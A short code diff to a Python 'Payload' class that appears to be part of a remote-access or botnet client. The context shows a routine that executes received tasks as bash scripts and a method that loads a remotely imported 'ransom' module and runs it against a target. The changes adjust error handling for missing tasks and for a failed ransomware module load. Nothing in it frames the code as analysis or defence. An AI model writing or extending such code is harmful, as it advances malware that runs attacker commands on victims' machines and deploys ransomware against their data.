@@ -151,10 +151,12 @@ class Payload():
         This can be optimized away when task is only arg to function
         """
         if task == None:
-            return False
+            def NoTask():
+                return "No task passed into _get_command"
+            return NoTask
 
         # Define a function which will execute the text as a bash script
-        def execute_task():
+        def execute_task(tmp = None):
             # Encode the task if needed
             encoded_task = task['task'].encode()
 
@@ -949,6 +951,8 @@ class Payload():
         try:
             if 'ransom' not in globals():
                 load_res = self.load('ransom')
+                if 'remotely imported' not in load_res:
+                    return load_res
 
             res = globals()['ransom'].run(target)
             return res
